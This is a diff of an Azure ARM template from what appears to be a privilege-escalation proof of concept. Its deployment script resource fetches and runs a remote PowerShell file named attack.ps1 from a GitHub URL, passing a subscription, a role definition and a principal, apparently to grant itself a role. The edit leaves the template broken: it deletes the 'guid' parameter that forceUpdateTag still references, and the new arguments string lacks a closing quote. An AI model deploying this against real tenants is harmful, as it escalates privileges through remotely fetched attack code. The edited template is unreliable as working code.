@@ -7,15 +7,11 @@
         },
         "roleDefinition": {
             "type": "string",
-            "defaultValue": '8e3af657-a8ff-443c-a75c-2fe8c4bcb635'
+            "defaultValue": "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
         },
         "principalId": {
             "type": "string",
-            "defaultValue": '301dfac7-8f45-48ac-9868-e1f0e875385c'
-        },
-        "guid": {
-            "type": "string",
-            "defaultValue": "40310b4c-ec37-4331-8f5a-d320618b5382"
+            "defaultValue": "301dfac7-8f45-48ac-9868-e1f0e875385c"
         }
     },
     "resources": [
@@ -34,7 +30,7 @@
             "properties": {
                 "forceUpdateTag": "[parameters('guid')]",
                 "azPowerShellVersion": "5.4",
-                "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2} -guid {3}', '7570c6f7-9ca9-409b-aeaf-cb0f5ac1ad50', '8e3af657-a8ff-443c-a75c-2fe8c4bcb635', '301dfac7-8f45-48ac-9868-e1f0e875385c', '40310b4c-ec37-4331-8f5a-d320618b5382')]",
+                "arguments": "[format(' -subscriptionId {0} -roleDefinition {1} -principalId {2}, '7570c6f7-9ca9-409b-aeaf-cb0f5ac1ad50', '8e3af657-a8ff-443c-a75c-2fe8c4bcb635', '301dfac7-8f45-48ac-9868-e1f0e875385c')]",
                 "primaryScriptUri": "https://raw.githubusercontent.com/SecureHats/azure-misfit/azurekid/priv-esc/poc/priv-esc-arm-template/attack.ps1",
                 "supportingScriptUris": [],
                 "timeout": "PT30M",
